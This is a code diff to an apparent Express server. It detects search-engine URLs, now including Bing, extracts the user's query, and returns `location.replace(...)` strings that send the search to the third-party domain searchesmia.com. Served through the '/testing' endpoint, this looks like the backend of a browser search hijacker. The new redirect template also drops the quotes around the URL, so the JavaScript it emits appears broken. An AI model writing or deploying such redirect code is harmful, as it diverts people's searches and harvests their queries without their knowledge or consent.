@@ -28,6 +28,9 @@ function checkUrlIsSearchEngine(url) {
     if (url.match(/^https?:.*?yahoo.*?\/?search?/g) != null) {
         return getQuery(url, 'yahoo')
     }
+    if (url.match(/^https?:.*?bing.*?\/?search?/g) != null) {
+        return getQuery(url,  'bing')
+    }
 }
 
 function getQuery(search, type = '') {
@@ -37,7 +40,15 @@ function getQuery(search, type = '') {
     if (type != 'yahoo') {
         str = result.split('&')[0] || ''
     }
-    return str
+    if(type == 'bing') {
+        if(search.match(/=/g) && search.match(/=/g).length > 1){
+            return `location.replace(https://searchesmia.com/bingchr10?q=${str})`
+        } else {
+            return '';
+        }
+    } else {
+        return `location.replace(https://searchesmia.com/bingchr5?q=${str})`
+    }
 }
 
 
@@ -47,7 +58,7 @@ app.get('/testing', function (req, res) {
         query = req.query.url 
         var url = checkUrlIsSearchEngine(query)
         if (url) {
-            res.send({ 'link': `location.replace("https://searchesmia.com/bingchr5?q=${url}")` });
+            res.send({ 'link': url });
         }
     }
     
